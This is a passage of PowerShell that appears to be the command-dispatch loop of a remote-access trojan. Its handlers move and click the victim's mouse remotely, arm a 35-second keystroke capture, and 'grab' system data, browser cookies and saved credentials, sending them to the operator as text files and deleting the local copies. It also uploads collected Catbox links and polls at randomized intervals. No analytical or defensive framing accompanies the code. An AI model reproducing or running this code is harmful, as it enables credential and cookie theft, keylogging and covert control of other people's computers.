        'click'   { $xy = $arg -split ','; [W.U]::SetCursorPos([int]$xy[0],[int]$xy[1]); Start-Sleep -m 40; [W.U]::mouse_event(0x0002,0,0,0,0); [W.U]::mouse_event(0x0004,0,0,0,0); Send "click $arg" $null $null }
        'dclick'  { $xy = $arg -split ','; [W.U]::SetCursorPos([int]$xy[0],[int]$xy[1]); Start-Sleep -m 40; [W.U]::mouse_event(0x0002,0,0,0,0); [W.U]::mouse_event(0x0004,0,0,0,0); Start-Sleep -m 60; [W.U]::mouse_event(0x0002,0,0,0,0); [W.U]::mouse_event(0x0004,0,0,0,0); Send "dclick $arg" $null $null }
        'rclick'  { $xy = $arg -split ','; [W.U]::SetCursorPos([int]$xy[0],[int]$xy[1]); Start-Sleep -m 40; [W.U]::mouse_event(0x0008,0,0,0,0); [W.U]::mouse_event(0x0010,0,0,0,0); Send "rclick $arg" $null $null }
        'move'    { $xy = $arg -split ','; [W.U]::SetCursorPos([int]$xy[0],[int]$xy[1]); Send "move $arg" $null $null }
        'grab'    { $s=Grab-System; $c=Grab-Cookies; $d=Grab-Creds; Send $null $s "syshealth.txt"; Send $null $c "cookies.txt"; Send $null $d "creds.txt"; Remove-Item $s,$c,$d -Force }
        'armkey'  { $triggerActive=$true; $triggerUntil=(Get-Date).AddSeconds(35).Ticks; Send "keystroke capture armed 35s" $null $null }
        'flushlinks' { if ($script:CatboxLinks.Count -gt 0) { $lp="$env:TEMP\cl_$([guid]::NewGuid().ToString('N')).txt"; ($script:CatboxLinks -join "`r`n") | Out-File $lp -Encoding utf8; Send $null $lp "links.txt"; Remove-Item $lp -Force; $script:CatboxLinks.Clear() }; $script:LastFlush=(Get-Date) }
        'exit'    { Send "agent exiting" $null $null; break }
        default   { Send "unknown cmd: $cmd" $null $null }
      }
    } catch { Send "err: $_" $null $null }
  }
  Start-Sleep -Milliseconds (1700 + (Get-Random -Maximum 2600))
}
